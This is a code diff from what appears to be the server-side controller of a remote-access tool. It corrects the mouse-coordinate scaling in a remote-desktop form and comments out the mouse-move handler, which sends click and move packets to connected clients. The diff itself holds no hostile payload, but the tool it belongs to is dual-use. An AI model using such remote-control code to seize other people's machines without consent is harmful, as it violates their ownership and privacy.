@@ -180,7 +180,7 @@ namespace Server.Forms
             {
                 if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isMouse)
                 {
-                    Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
+                    Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                     int button = 0;
                     if (e.Button == MouseButtons.Left)
                         button = 2;
@@ -205,7 +205,7 @@ namespace Server.Forms
             {
                 if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isMouse)
                 {
-                    Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
+                    Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                     int button = 0;
                     if (e.Button == MouseButtons.Left)
                         button = 4;
@@ -215,32 +215,32 @@ namespace Server.Forms
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                     msgpack.ForcePathObject("Option").AsString = "mouseClick";
-                    msgpack.ForcePathObject("X").AsInteger = (Int32)(p.X);
-                    msgpack.ForcePathObject("Y").AsInteger = (Int32)(p.Y);
-                    msgpack.ForcePathObject("Button").AsInteger = (Int32)(button);
+                    msgpack.ForcePathObject("X").AsInteger = p.X;
+                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
+                    msgpack.ForcePathObject("Button").AsInteger = button;
                     ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
             catch { }
         }
 
-        private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
-        {
-            try
-            {
-                if (pictureBox1.Image != null && this.ContainsFocus && isMouse)
-                {
-                    Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-                    msgpack.ForcePathObject("Option").AsString = "mouseMove";
-                    msgpack.ForcePathObject("X").AsInteger = (Int32)(p.X);
-                    msgpack.ForcePathObject("Y").AsInteger = (Int32)(p.Y);
-                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
-                }
-            }
-            catch { }
-        }
+        //private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
+        //{
+        //    try
+        //    {
+        //        if (pictureBox1.Image != null && this.ContainsFocus && isMouse)
+        //        {
+        //            Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
+        //            MsgPack msgpack = new MsgPack();
+        //            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+        //            msgpack.ForcePathObject("Option").AsString = "mouseMove";
+        //            msgpack.ForcePathObject("X").AsInteger = (Int32)(p.X);
+        //            msgpack.ForcePathObject("Y").AsInteger = (Int32)(p.Y);
+        //            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+        //        }
+        //    }
+        //    catch { }
+        //}
 
         private void Button3_Click(object sender, EventArgs e)
         {
